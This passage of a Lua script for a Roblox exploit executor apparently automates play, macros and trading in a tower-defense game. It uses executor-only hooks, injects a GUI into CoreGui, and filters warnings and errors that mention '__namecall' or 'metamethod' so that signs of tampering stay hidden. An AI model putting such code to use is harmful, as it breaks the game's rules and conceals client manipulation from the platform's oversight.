        Name = "UI Blur",
        Default = false,
        Callback = function(bool)
            Window:SetAcrylicBlurState(bool)
            enableBlur = bool
            Window:Notify({
                Title = Window.Settings.Title,
                Description = (bool and "Enabled" or "Disabled") .. " UI Blur",
                Lifetime = 5
            })
        end,
    })
    Window:SetAcrylicBlurState(globalSettings.UIBlurToggle:GetState())
end, "Create UI Blur global setting")()

ErrorHandler:wrap(function()
    globalSettings.NotificationToggler = Window:GlobalSetting({
        Name = "Notifications",
        Default = Window:GetNotificationsState(),
        Callback = function(bool)
            Window:SetNotificationsState(bool)
            Window:Notify({
                Title = Window.Settings.Title,
                Description = (bool and "Enabled" or "Disabled") .. " Notifications",
                Lifetime = 5
            })
        end,
    })
end, "Create Notifications global setting")()

ErrorHandler:wrap(function()
    globalSettings.ShowUserInfo = Window:GlobalSetting({
        Name = "Show User Info",
        Default = Window:GetUserInfoState(),
        Callback = function(bool)
            Window:SetUserInfoState(bool)
            Window:Notify({
                Title = Window.Settings.Title,
                Description = (bool and "Showing" or "Redacted") .. " User Info",
                Lifetime = 5
            })
        end,
    })
end, "Create Show User Info global setting")()


Window.onUnloaded(function()
    debugPrint("[Cleanup] Unloading script...")
    
    getgenv().ALSScriptLoaded = false
    getgenv().MacroPlayEnabled = false
    getgenv().MacroRecordingV2 = false
    getgenv().AutoAbilitiesEnabled = false
    
    pcall(function()
        local stats = ConnectionManager:getStats()
        debugPrint(string.format("[Cleanup] Disconnecting %d active connections...", stats.active))
        ConnectionManager:disconnectAll()
    end)
    
    pcall(function()
        if cashConnection then cashConnection:Disconnect() end
        if cashTrackingConnection then cashTrackingConnection:Disconnect() end
        for tower, conn in pairs(towerTracker.upgradeConnections or {}) do
            if conn then conn:Disconnect() end
        end
    end)
    
    pcall(function()
        if getgenv()._GlobalConnections then
            for _, conn in pairs(getgenv()._GlobalConnections) do
                if conn and conn.Disconnect then
                    conn:Disconnect()
                end
            end
            getgenv()._GlobalConnections = {}
        end
    end)
    
    pcall(function()
        if getgenv()._AutoRejoinConnections then
            for _, conn in pairs(getgenv()._AutoRejoinConnections) do
                if conn and conn.Disconnect then
                    conn:Disconnect()
                end
            end
            getgenv()._AutoRejoinConnections = {}
        end
    end)
    
    pcall(function()
        if getgenv()._PositionHolograms then
            for _, hologramData in pairs(getgenv()._PositionHolograms) do
                if hologramData.part then hologramData.part:Destroy() end
                if hologramData.beam then hologramData.beam:Destroy() end
            end
            getgenv()._PositionHolograms = {}
        end
    end)
    
    pcall(function()
        if getgenv()._DynamicSummonSections then
            getgenv()._DynamicSummonSections = {}
        end
    end)
    
    if ConnectionManager then
        ConnectionManager:cleanup()
    end
    
    pcall(function()
        if getgenv()._LoadingScreenMonitor_stopMonitoring then
            getgenv()._LoadingScreenMonitor_stopMonitoring()
        end
    end)
    
    pcall(function()
        if getgenv()._CrashMonitor_stopMonitoring then
            getgenv()._CrashMonitor_stopMonitoring()
        end
    end)
    
    pcall(function()
        if getgenv().RestartRecovery then
            getgenv().RestartRecovery.isRecovering = false
            getgenv().RestartRecovery.currentAttempt = 0
        end
    end)
    
    pcall(function()
        if getgenv().SeamlessRestartManager then
            getgenv().SeamlessRestartManager.isRestarting = false
        end
    end)
    
    pcall(cleanupTowerTracker)
    
    getgenv().MacroTowerInfoCache = nil
    getgenv().MacroRemoteCache = nil
    getgenv().MacroCashHistory = nil
    getgenv().MacroDataV2 = nil
    getgenv().MacroActionsV2 = nil
    getgenv().MacroPlaybackMacroData = nil
    getgenv().WukongTrackedClones = nil
    getgenv().SmartCardPicked = nil
    getgenv().SlowerCardPicked = nil
    getgenv()._lastWebhookHashList = nil
    getgenv()._AbilityUIElements = nil
    
    for i = 1, 3 do
        safeGarbageCollect()
    end
    
    debugPrint("[Cleanup] Complete")
end)

task.spawn(function()
    local lastPing = 0
    local highPingCount = 0
    local connectionCheckCount = 0
    local startTime = tick()
    local lastMemoryCleanup = tick()
    
    while task.wait(5) do
        pcall(function()
            connectionCheckCount = connectionCheckCount + 1
            local uptime = (tick() - startTime) / 3600
            
            local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
            
            if ping > 1000 then
                highPingCount = highPingCount + 1
                warn("[Network] High ping: " .. math.floor(ping) .. "ms (" .. highPingCount .. "/3)")
                
                if highPingCount >= 3 then
                    warn("[Network] Persistent high ping - cleaning memory")
                    safeGarbageCollect()
                    highPingCount = 0
                end
            else
                highPingCount = 0
            end
            
            if connectionCheckCount % 720 == 0 then
                print(string.format("[Status] Uptime: %.1fh | Ping: %dms", uptime, math.floor(ping)))
            end
            
            if uptime > 2 and (tick() - lastMemoryCleanup) > 1800 then
                debugPrint("[Memory] 30min cleanup cycle")
                safeGarbageCollect()
                lastMemoryCleanup = tick()
            end
            
            lastPing = ping
        end)
    end
end)

task.wait(2)

local function isTeleportUIVisible()
    local tpUI = LocalPlayer.PlayerGui:FindFirstChild("TeleportUI")
    if not tpUI then return false end
    
    local ok, visible = pcall(function()
        return tpUI.Enabled
    end)
    return ok and visible
end

local function isPlayerInValidState()
    local character = LocalPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChild("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return false end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return false end
    return true
end

local maxWaitTime = 0
local maxWait = 60
local lastStateCheck = tick()
repeat
    task.wait(0.2)
    maxWaitTime = maxWaitTime + 0.2
    
    if tick() - lastStateCheck > 10 then
        lastStateCheck = tick()
        if isTeleportUIVisible() and not isPlayerInValidState() then
            warn("[ALS] Still loading after " .. math.floor(maxWaitTime) .. "s, attempting recovery...")
            
            if not getgenv()._LastLoadingRecoveryTime then
                getgenv()._LastLoadingRecoveryTime = 0
            end
            
            local currentTime = tick()
            local timeSinceLastRecovery = currentTime - getgenv()._LastLoadingRecoveryTime
            
            if timeSinceLastRecovery >= 15 then
                if ConnectionManager then
                    ConnectionManager:disconnectAll()
                end
                
                pcall(function()
                    collectgarbage("collect")
                end)
                
                task.wait(2)
                
                local TeleportService = game:GetService("TeleportService")
                pcall(function()
                    TeleportService:Teleport(12886143095, LocalPlayer)
                    getgenv()._LastLoadingRecoveryTime = tick()
                end)
                task.wait(5)
            end
        end
    end
until (not isTeleportUIVisible() and isPlayerInValidState()) or maxWaitTime > maxWait

if maxWaitTime > maxWait and not isPlayerInValidState() then
    warn("[ALS] Failed to load properly after " .. maxWait .. "s, forcing rejoin...")
    
    if not getgenv()._LastLoadingRecoveryTime then
        getgenv()._LastLoadingRecoveryTime = 0
    end
    
    local currentTime = tick()
    local timeSinceLastRecovery = currentTime - getgenv()._LastLoadingRecoveryTime
    
    if timeSinceLastRecovery >= 15 then
        if ConnectionManager then
            ConnectionManager:disconnectAll()
        end
        
        pcall(function()
            collectgarbage("collect")
        end)
        
        task.wait(2)
        
        local TeleportService = game:GetService("TeleportService")
        pcall(function()
            TeleportService:Teleport(12886143095, LocalPlayer)
            getgenv()._LastLoadingRecoveryTime = tick()
        end)
    end
    task.wait(10)
end

task.wait(1)

if not getgenv().Config.hasJoinedDiscord then
    Window:Dialog({
        Title = "Join Our Discord!",
        Description = "Have you joined the Byorl Last Stand Discord server? Get updates, support, and connect with the community!",
        Buttons = {
            {
                Name = "Yes, I'm in!",
                Callback = function()
                    getgenv().Config.hasJoinedDiscord = true
                    saveConfig(getgenv().Config)
                    Window:Notify({
                        Title = "Byorl Last Stand",
                        Description = "Awesome! Thanks for being part of the community!",
                        Lifetime = 3
                    })
                end,
            },
            {
                Name = "Not yet",
                Callback = function()
                    getgenv().Config.hasJoinedDiscord = true
                    saveConfig(getgenv().Config)
                    
                    if setclipboard then
                        setclipboard("https://discord.gg/V3WcdHpd3J")
                    end
                    
                    Window:Notify({
                        Title = "Byorl Last Stand",
                        Description = "Discord link copied! Opening in browser...",
                        Lifetime = 5
                    })
                    
                    task.wait(0.5)
                    
                    local success = pcall(function()
                        if request then
                            request({
                                Url = "https://discord.gg/V3WcdHpd3J",
                                Method = "GET"
                            })
                        end
                    end)
                    
                    if not success then
                        Window:Notify({
                            Title = "Byorl Last Stand",
                            Description = "Link copied to clipboard: discord.gg/V3WcdHpd3J",
                            Lifetime = 5
                        })
                    end
                end,
            }
        }
    })
end

getgenv()._AbilityUIBuilt = false
getgenv()._AbilityUIBuilding = false

local function shouldFilterMessage(msg)
    local msgLower = msg:lower()
    
    if msgLower:find("playermodule") 
        or msgLower:find("cameramodule") 
        or msgLower:find("zoomcontroller")
        or msgLower:find("popper")
        or msgLower:find("poppercam")
        or msgLower:find("imagelabel")
        or msgLower:find("not a valid member")
        or msgLower:find("is not a valid member")
        or msgLower:find("attempt to perform arithmetic")
        or msgLower:find("playerscripts")
        or msgLower:find("byorials")
        or msgLower:find("stack begin")
        or msgLower:find("stack end")
        or msgLower:find("runservice")
        or msgLower:find("firerenderstepearlyfunctions")
        or msgLower:find("firerenderstep")
        or msgLower:find("metamethod")
        or msgLower:find("__namecall")
        or msgLower:find("unexpected error while invoking callback")
        or msgLower:find("frogionsol") then
        return true
    end
    
    return false
end

local oldLogWarn = logwarn or warn
local oldLogError = logerror or error

local function createFilteredLogger(originalLogger)
    return function(...)
        local args = {...}
        local msg = ""
        for i, v in ipairs(args) do
            msg = msg .. tostring(v)
        end
        if not shouldFilterMessage(msg) then
            originalLogger(...)
        end
    end
end

if logwarn then logwarn = createFilteredLogger(oldLogWarn) end
warn = createFilteredLogger(oldLogWarn)
if logerror then logerror = createFilteredLogger(oldLogError) end

local oldErrorHandler = geterrorhandler and geterrorhandler()
if seterrorhandler then
    seterrorhandler(function(msg)
        if not shouldFilterMessage(tostring(msg)) then
            if oldErrorHandler then
                oldErrorHandler(msg)
            else
                oldLogError(msg)
            end
        end
    end)
end

local function cleanupBeforeTeleport()    
    pcall(function()
        if Window and Window.Unload then
            Window:Unload()
        end
    end)
    
    pcall(function()
        getgenv().AutoAbilitiesEnabled = nil
        getgenv().CardSelectionEnabled = nil
        getgenv().SlowerCardSelectionEnabled = nil
    end)
    
    pcall(function()
        if cashConnection then cashConnection:Disconnect() end
        if cashTrackingConnection then cashTrackingConnection:Disconnect() end
        for tower, conn in pairs(towerTracker.upgradeConnections or {}) do
            if conn then conn:Disconnect() end
        end
    end)
    
    pcall(function()
        if getconnections then
            for _, service in pairs({RunService.Heartbeat, RunService.RenderStepped, RunService.Stepped}) do
                for _, connection in pairs(getconnections(service)) do
                    if connection.Disable then connection:Disable() end
                    if connection.Disconnect then connection:Disconnect() end
                end
            end
        end
    end)
    
    pcall(function()
        getgenv().MacroTowerInfoCache = nil
        getgenv().MacroRemoteCache = nil
        getgenv().MacroCashHistory = nil
        if not getgenv().MacroRecordingV2 then
            getgenv().MacroDataV2 = nil
        end
        towerTracker = {
            placeCounts = {},
            upgradeLevels = {},
            lastPlaceTime = {},
            lastUpgradeTime = {},
            pendingActions = {},
            upgradeConnections = {}
        }
    end)
    
    if ConnectionManager then
        ConnectionManager:disconnectAll()
    end
    
    pcall(function()
        collectgarbage("collect")
    end)
    
    task.wait(0.5)
end

getgenv().CleanupBeforeTeleport = cleanupBeforeTeleport

MacLib:SetFolder(CONFIG_FOLDER)


local TabGroup1 = ErrorHandler:wrap(function()
    return Window:TabGroup()
end, "Create TabGroup1")()

local TabGroup2 = ErrorHandler:wrap(function()
    return Window:TabGroup()
end, "Create TabGroup2")()

local TabGroup3 = ErrorHandler:wrap(function()
    return Window:TabGroup()
end, "Create TabGroup3")()

if not TabGroup1 or not TabGroup2 or not TabGroup3 then
    ErrorHandler:log("ERROR", "Failed to create tab groups")
    error("[ALS] Failed to create tab groups")
    return
end


local Tabs = {}

Tabs.Main = ErrorHandler:wrap(function()
    return TabGroup1:Tab({ 
        Name = "Main", 
        Image = "rbxassetid://10734950309" 
    })
end, "Create Main tab")()

Tabs.AutoPlay = ErrorHandler:wrap(function()
    return TabGroup1:Tab({ 
        Name = "Auto Play", 
        Image = "rbxassetid://10723407389" 
    })
end, "Create AutoPlay tab")()

Tabs.Macro = ErrorHandler:wrap(function()
    return TabGroup1:Tab({ 
        Name = "Macro", 
        Image = "rbxassetid://10734923549" 
    })
end, "Create Macro tab")()

Tabs.Abilities = ErrorHandler:wrap(function()
    return TabGroup1:Tab({ 
        Name = "Abilities", 
        Image = "rbxassetid://10747373176" 
    })
end, "Create Abilities tab")()

Tabs.Portals = ErrorHandler:wrap(function()
    return TabGroup1:Tab({ 
        Name = "Portals", 
        Image = "rbxassetid://10723407389" 
    })
end, "Create Portals tab")()

-- Event tab removed - code saved in Event1_Event2_Backup.lua
-- Tabs.Event = ErrorHandler:wrap(function()
--     return TabGroup2:Tab({ 
--         Name = "Event", 
--         Image = "rbxassetid://10734952273" 
--     })
-- end, "Create Event tab")()

-- Event2 tab removed - code saved in Event1_Event2_Backup.lua
-- Tabs.Event2 = ErrorHandler:wrap(function()
--     return TabGroup2:Tab({ 
--         Name = "Event 2", 
--         Image = "rbxassetid://10734952273" 
--     })
-- end, "Create Event2 tab")()

Tabs.Event3 = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Event 3", 
        Image = "rbxassetid://10734952273" 
    })
end, "Create Event3 tab")()

Tabs.SlimeRush = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Slime Rush", 
        Image = "rbxassetid://10734923549" 
    })
end, "Create SlimeRush tab")()

Tabs.BossRush = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Boss Rush", 
        Image = "rbxassetid://10734923549" 
    })
end, "Create BossRush tab")()

Tabs.Breach = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Breach", 
        Image = "rbxassetid://10747374131" 
    })
end, "Create Breach tab")()

Tabs.FinalExpedition = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Final Expedition", 
        Image = "rbxassetid://10723407389" 
    })
end, "Create FinalExpedition tab")()

Tabs.InfinityCastle = ErrorHandler:wrap(function()
    return TabGroup2:Tab({ 
        Name = "Infinity Castle", 
        Image = "rbxassetid://10734923549" 
    })
end, "Create InfinityCastle tab")()

Tabs.Webhook = ErrorHandler:wrap(function()
    return TabGroup3:Tab({ 
        Name = "Webhook", 
        Image = "rbxassetid://10734952273" 
    })
end, "Create Webhook tab")()

Tabs.SeamlessFix = ErrorHandler:wrap(function()
    return TabGroup3:Tab({ 
        Name = "Automation", 
        Image = "rbxassetid://10734923549" 
    })
end, "Create SeamlessFix tab")()

Tabs.AutoTrade = ErrorHandler:wrap(function()
    return TabGroup3:Tab({ 
        Name = "Auto Trade", 
        Image = "rbxassetid://10747373176" 
    })
end, "Create AutoTrade tab")()

Tabs.Misc = ErrorHandler:wrap(function()
    return TabGroup3:Tab({ 
        Name = "Misc", 
        Image = "rbxassetid://10734949856" 
    })
end, "Create Misc tab")()

Tabs.Settings = ErrorHandler:wrap(function()
    return TabGroup3:Tab({ 
        Name = "Settings", 
        Image = "rbxassetid://10734949856" 
    })
end, "Create Settings tab")()

local tabCount = 0
for name, tab in pairs(Tabs) do
    if tab then
        tabCount = tabCount + 1
    else
        ErrorHandler:log("WARN", "Failed to create tab: " .. name)
    end
end



local ToggleGui, ToggleButton

ErrorHandler:wrap(function()
    ToggleGui = Instance.new("ScreenGui")
    ToggleGui.Name = "ALS_Fluent_Toggle"
    ToggleGui.ResetOnSpawn = false
    ToggleGui.IgnoreGuiInset = true
    ToggleGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ToggleGui.Parent = game:GetService("CoreGui")
    
    ToggleButton = Instance.new("TextButton")
    ToggleButton.Name = "ToggleButton"
    ToggleButton.Size = UDim2.new(0, 100, 0, 100)
    ToggleButton.Position = UDim2.new(1, -10, 0.5, 0)
    ToggleButton.AnchorPoint = Vector2.new(1, 0.5)
    ToggleButton.BackgroundColor3 = Color3.fromRGB(85, 85, 100)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Text = "Byorl\nLast\nStand"
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.TextSize = 16
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.Active = true
    ToggleButton.Draggable = true
    ToggleButton.Parent = ToggleGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = ToggleButton
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 120)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 75, 90))
    })
    gradient.Rotation = 90
    gradient.Parent = ToggleButton
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(130, 130, 160)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = ToggleButton
    
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.BackgroundTransparency = 1
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(1, 20, 1, 20)
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Image = "rbxassetid://5554236805"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = -1
    shadow.Parent = ToggleButton
    
    ToggleButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(ToggleButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(105, 105, 125)
        }):Play()
        game:GetService("TweenService"):Create(stroke, TweenInfo.new(0.2), {
            Color = Color3.fromRGB(150, 150, 190)
        }):Play()
    end)
    
    ToggleButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(ToggleButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(85, 85, 100)
        }):Play()
        game:GetService("TweenService"):Create(stroke, TweenInfo.new(0.2), {
            Color = Color3.fromRGB(130, 130, 160)
        }):Play()
    end)
    
end, "Create toggle button GUI")()

local function getCurrentMenuKey()
    local keyName = getgenv().Config.inputs["MenuKeybind"] or "LeftControl"
    local success, keyCode = pcall(function()
        return Enum.KeyCode[keyName]
    end)
    return success and keyCode or Enum.KeyCode.LeftControl
end

local function toggleUI()
    ErrorHandler:wrap(function()
        local currentKey = getCurrentMenuKey()
        VIM:SendKeyEvent(true, currentKey, false, game)
        task.wait(0.05)
        VIM:SendKeyEvent(false, currentKey, false, game)
    end, "Toggle UI")()
end

if ToggleButton then
    ConnectionManager:track(
        ToggleButton.MouseButton1Click:Connect(toggleUI),
        { group = "UI", context = "Toggle button click" }
    )
end


local Sections = {}

local function createSection(tab, tabName, side)
    return ErrorHandler:wrap(function()
        if not tab then
            ErrorHandler:log("WARN", string.format("Tab %s is nil, cannot create section", tabName))
            return nil
        end
        return tab:Section({ Side = side })
    end, string.format("Create %s %s section", tabName, side))()
end

Sections.MainLeft = createSection(Tabs.Main, "Main", "Left")
Sections.MainRight = createSection(Tabs.Main, "Main", "Right")

Sections.AutoPlayLeft = createSection(Tabs.AutoPlay, "AutoPlay", "Left")
Sections.AutoPlayRight = createSection(Tabs.AutoPlay, "AutoPlay", "Right")

Sections.MacroLeft = createSection(Tabs.Macro, "Macro", "Left")
Sections.MacroRight = createSection(Tabs.Macro, "Macro", "Right")

Sections.PortalsLeft = createSection(Tabs.Portals, "Portals", "Left")
Sections.PortalsRight = createSection(Tabs.Portals, "Portals", "Right")

Sections.BossRushLeft = createSection(Tabs.BossRush, "BossRush", "Left")
Sections.BossRushRight = createSection(Tabs.BossRush, "BossRush", "Right")

Sections.BreachLeft = createSection(Tabs.Breach, "Breach", "Left")
Sections.BreachRight = createSection(Tabs.Breach, "Breach", "Right")

Sections.FinalExpeditionLeft = createSection(Tabs.FinalExpedition, "FinalExpedition", "Left")
Sections.FinalExpeditionRight = createSection(Tabs.FinalExpedition, "FinalExpedition", "Right")

Sections.InfinityCastleLeft = createSection(Tabs.InfinityCastle, "InfinityCastle", "Left")
Sections.InfinityCastleRight = createSection(Tabs.InfinityCastle, "InfinityCastle", "Right")

-- Sections.EventLeft = createSection(Tabs.Event, "Event", "Left")
-- Sections.EventRight = createSection(Tabs.Event, "Event", "Right")

-- Sections.Event2Left = createSection(Tabs.Event2, "Event2", "Left")
-- Sections.Event2Right = createSection(Tabs.Event2, "Event2", "Right")

Sections.Event3Left = createSection(Tabs.Event3, "Event3", "Left")
Sections.Event3Right = createSection(Tabs.Event3, "Event3", "Right")

Sections.SlimeRushLeft = createSection(Tabs.SlimeRush, "SlimeRush", "Left")
Sections.SlimeRushRight = createSection(Tabs.SlimeRush, "SlimeRush", "Right")

Sections.WebhookLeft = createSection(Tabs.Webhook, "Webhook", "Left")

Sections.SeamlessFixLeft = createSection(Tabs.SeamlessFix, "SeamlessFix", "Left")
Sections.SeamlessFixRight = createSection(Tabs.SeamlessFix, "SeamlessFix", "Right")

Sections.AutoTradeLeft = createSection(Tabs.AutoTrade, "AutoTrade", "Left")
Sections.AutoTradeRight = createSection(Tabs.AutoTrade, "AutoTrade", "Right")

Sections.MiscLeft = createSection(Tabs.Misc, "Misc", "Left")
Sections.MiscRight = createSection(Tabs.Misc, "Misc", "Right")

Sections.SettingsLeft = createSection(Tabs.Settings, "Settings", "Left")
Sections.SettingsRight = createSection(Tabs.Settings, "Settings", "Right")

local sectionCount = 0
for name, section in pairs(Sections) do
    if section then
        sectionCount = sectionCount + 1
    else
        ErrorHandler:log("WARN", "Failed to create section: " .. name)
    end
end


ErrorHandler:wrap(function()
    if Tabs.Main then
        Tabs.Main:Select()
    end
end, "Select Main tab")()




local function createUIElementWithRetry(elementType, section, config, retryAttempts)
    retryAttempts = retryAttempts or 3
    local retryDelay = 0.5
    
    for attempt = 1, retryAttempts do
        local success, element = pcall(function()
            return UIFactory:createElement(elementType, section, config)
        end)
        
        if success and element then
            if attempt > 1 then
                ErrorHandler:log("INFO", string.format("✓ Created %s '%s' on attempt %d", 
                    elementType, config.name or "Unknown", attempt))
            end
            return element
        else
            ErrorHandler:log("WARN", string.format("Failed to create %s '%s' (attempt %d/%d): %s", 
                elementType, config.name or "Unknown", attempt, retryAttempts, tostring(element)))
            
            if attempt < retryAttempts then
                task.wait(retryDelay)
            end
        end
    end
    
    ErrorHandler:log("ERROR", string.format("Failed to create %s '%s' after %d attempts", 
        elementType, config.name or "Unknown", retryAttempts))
    
    return nil
end


getgenv().createToggle = function(section, name, flag, callback, default)
    return UIFactory:createElement("Toggle", section, {
        name = name or "Toggle",
        flag = flag,
        callback = callback,
        default = default or false,
        autoSave = true
    })
end

getgenv().createToggleNoSave = function(section, name, flag, callback, default)
    return UIFactory:createElement("Toggle", section, {
        name = name or "Toggle",
        flag = flag,
        callback = callback,
        default = default or false,
        autoSave = false
    })
end

getgenv().createInput = function(section, name, flag, placeholder, charType, callback, default)
    return UIFactory:createElement("Input", section, {
        name = name or "Input",
        flag = flag,
        placeholder = placeholder or "",
        charType = charType or "All",
        callback = callback,
        default = default or "",
        autoSave = true
    })
end

getgenv().createDropdown = function(section, name, flag, options, multi, callback, default)
    return UIFactory:createElement("Dropdown", section, {
        name = name or "Dropdown",
        flag = flag,
        options = options or {},
        multi = multi or false,
        callback = callback,
        default = default or (multi and {} or 1),
        autoSave = true
    })
end

getgenv().createSlider = function(section, name, flag, minimum, maximum, default, callback, displayMethod, precision)
    return UIFactory:createElement("Slider", section, {
        name = name or "Slider",
        flag = flag,
        minimum = minimum or 0,
        maximum = maximum or 100,
        default = default or minimum,
        displayMethod = displayMethod or "Default",
        precision = precision,
        callback = callback,
        autoSave = true
    })
end

getgenv().createMutuallyExclusiveToggle = function(section, name, flag, otherToggle, otherFlag, callback, default)
    local toggle = UIFactory:createElement("Toggle", section, {
        name = name,
        flag = flag,
        default = default or false,
        autoSave = true,
        callback = function(value)
            if callback then 
                callback(value) 
            end
            
            if value and otherToggle then
                getgenv().Config.toggles[otherFlag] = false
                saveConfig(getgenv().Config)
                pcall(function()
                    otherToggle:UpdateState(false)
                end)
            end
        end
    })
    
    return toggle
end


getgenv().createCardPriorityInputs = function(section, cardTable, targetPriorityTable, keyPrefix)
    if not cardTable or type(cardTable) ~= "table" then return end
    keyPrefix = keyPrefix or "Card_"
    
    local cardNames = {}
    for name in pairs(cardTable) do
        if name and name ~= "" then
            table.insert(cardNames, name)
        end
    end
    table.sort(cardNames, function(a, b)
        return (cardTable[a] or 999) < (cardTable[b] or 999)
    end)
    
    for _, cardName in ipairs(cardNames) do
        if cardName and cardName ~= "" then
            local configKey = keyPrefix .. tostring(cardName)
            local defaultValue = getgenv().Config.inputs[configKey] or tostring(cardTable[cardName] or 999)
            
            createInput(
                section,
                tostring(cardName),
                configKey,
                "Priority (1-999)",
                "Numeric",
                function(value)
                    local num = tonumber(value)
                    if num then
                        targetPriorityTable[cardName] = num
                    end
                end,
                tostring(defaultValue)
            )
            
            targetPriorityTable[cardName] = tonumber(defaultValue) or cardTable[cardName] or 999
        end
    end
end

getgenv().CreateToggle = createToggle
getgenv().CreateInput = createInput
getgenv().CreateDropdown = createDropdown
getgenv().CreateSlider = createSlider
getgenv().CreateMutuallyExclusiveToggle = createMutuallyExclusiveToggle


local MACRO_FOLDER = ConfigManager:getUserFolder() .. "/macros"
local SETTINGS_FILE = MACRO_FOLDER .. "/settings.json"
local OLD_MACRO_FOLDER = ConfigManager.configFolder .. "/macros"
local OLD_SETTINGS_FILE = OLD_MACRO_FOLDER .. "/settings.json"

if not isfolder(MACRO_FOLDER) then makefolder(MACRO_FOLDER) end

local function migrateMacrosToUserFolder()
    if not isfolder(OLD_MACRO_FOLDER) then
        return
    end
    
    local migratedCount = 0
    
    pcall(function()
        local oldFiles = listfiles(OLD_MACRO_FOLDER)
        if oldFiles then
            for _, filePath in ipairs(oldFiles) do
                local fileName = filePath:match("([^/\\]+)$")
                
                if fileName and fileName:match("%.json$") and fileName ~= "settings.json" then
                    local newFilePath = MACRO_FOLDER .. "/" .. fileName
                    
                    if not isfile(newFilePath) then
                        local content = readfile(filePath)
                        writefile(newFilePath, content)
                        migratedCount = migratedCount + 1
                        warn(string.format("[Macro Migration] Migrated: %s", fileName))
                    end
                end
            end
        end
    end)
    
    pcall(function()
        if isfile(OLD_SETTINGS_FILE) and not isfile(SETTINGS_FILE) then
            local content = readfile(OLD_SETTINGS_FILE)
            writefile(SETTINGS_FILE, content)
            warn("[Macro Migration] Migrated settings.json")
        end
    end)
    
    if migratedCount > 0 then
        warn(string.format("[Macro Migration] Successfully migrated %d macro(s) to user folder", migratedCount))
    end
end

migrateMacrosToUserFolder()

getgenv().Macros = {}
getgenv().MacroMaps = {}

local function loadMacroSettings()
    local settings = {
        playMacroEnabled = false,
        selectedMacro = nil,
        macroMaps = {},
        stepDelay = 0
    }
    pcall(function()
        if isfile(SETTINGS_FILE) then
            local data = HttpService:JSONDecode(readfile(SETTINGS_FILE))
            if type(data) == "table" then
                settings = data
            end
        end
    end)
    return settings
end

local function saveMacroSettings()
    pcall(function()
        local settings = {
            playMacroEnabled = getgenv().MacroPlayEnabled or false,
            selectedMacro = getgenv().CurrentMacro,
            macroMaps = getgenv().MacroMaps or {},
            stepDelay = getgenv().MacroStepDelay or 0
        }
        writefile(SETTINGS_FILE, HttpService:JSONEncode(settings))
    end)
end

local function saveMacro(name, data)
    local filePath = MACRO_FOLDER .. "/" .. name .. ".json"
    local maxRetries = 1
    local retryDelay = 1
    
    for attempt = 1, maxRetries + 1 do
        local success, err = pcall(function()
            local jsonData = HttpService:JSONEncode(data)
            writefile(filePath, jsonData)
            
            task.wait(0.1)
            
            if not isfile(filePath) then
                error("File verification failed: file does not exist after write")
            end
            
            local readSuccess, readData = pcall(function()
                return readfile(filePath)
            end)
            
            if not readSuccess then
                error("File verification failed: cannot read file - " .. tostring(readData))
            end
            
            local decodeSuccess, decodedData = pcall(function()
                return HttpService:JSONDecode(readData)
            end)
            
            if not decodeSuccess then
                error("File verification failed: invalid JSON - " .. tostring(decodedData))
            end
            
            getgenv().Macros[name] = data
        end)
        
        if success then
            getgenv()._DiagnosticsLogger_logSaveOperation(name, true, nil, attempt, maxRetries + 1)
            if attempt > 1 then
                debugPrint("[Macro] Save succeeded on retry attempt " .. attempt)
            end
            return true
        else
            local isLastAttempt = (attempt == maxRetries + 1)
            
            getgenv()._DiagnosticsLogger_logSaveOperation(name, false, tostring(err), attempt, maxRetries + 1)
            
            if isLastAttempt then
                warn("[Macro] Failed to save '" .. name .. "' after " .. (maxRetries + 1) .. " attempts")
                warn("[Macro] Error: " .. tostring(err))
                
                if Window and Window.Notify then
                    pcall(function()
                        Window:Notify({
                            Title = "Macro Save Failed",
                            Description = "Failed to save '" .. name .. "'. Check console for details.",
                            Lifetime = 8,
                            Style = "Cancel"
                        })
                    end)
                end
                
                return false
            else
                warn("[Macro] Save attempt " .. attempt .. " failed: " .. tostring(err))
                warn("[Macro] Retrying in " .. retryDelay .. " second(s)...")
                task.wait(retryDelay)
            end
        end
    end
    
    return false
end

local function convertOldMacroFormat(oldData)
    local newData = {}
    local sortedKeys = {}
    
    for key in pairs(oldData) do
        if key ~= "Data" and tonumber(key) then
            table.insert(sortedKeys, tonumber(key))
        end
    end
    table.sort(sortedKeys)
    
    for _, key in ipairs(sortedKeys) do
        local step = oldData[tostring(key)]
        if step and step.type and step.unit then
            local newStep = {
                Wave = 1,
                Time = 0,
                IsInvoke = false
            }
            
            if step.type == "SpawnUnit" then
                newStep.RemoteName = "PlaceTower"
                newStep.ActionType = "Place"
                
                local cframeArray = {}
                if step.cframe then
                    for num in string.gmatch(step.cframe, "[^,%s]+") do
                        local value = tonumber(num)
                        if value then
                            table.insert(cframeArray, value)
                        end
                    end
                end
                
